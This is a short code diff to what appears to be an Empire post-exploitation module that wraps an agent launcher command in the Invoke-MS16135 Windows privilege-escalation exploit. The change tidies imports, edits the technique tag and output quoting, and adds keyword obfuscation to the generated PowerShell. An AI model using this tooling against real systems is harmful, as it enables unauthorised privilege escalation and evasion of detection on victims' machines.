@@ -1,7 +1,10 @@
 from __future__ import print_function
-from builtins import str
+
 from builtins import object
+from builtins import str
+
 from lib.common import helpers
+
 
 class Module(object):
 
@@ -21,7 +24,7 @@ class Module(object):
 
             'Software': '',
 
-            'Techniques': ['T1068','TA0004'],
+            'Techniques': ['T1068'],
 
             'Background' : True,
 
@@ -108,7 +111,11 @@ class Module(object):
         launcherCode = launcherCode.replace("`", "``").replace("$", "`$").replace("\"","'")
         
         script += 'Invoke-MS16135 -Command "' + launcherCode + '"'
-        script += ';`nInvoke-MS16135 completed.'
+        script += ';"`nInvoke-MS16135 completed."'
+
         if obfuscate:
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+        script = helpers.keyword_obfuscation(script)
+
         return script
+
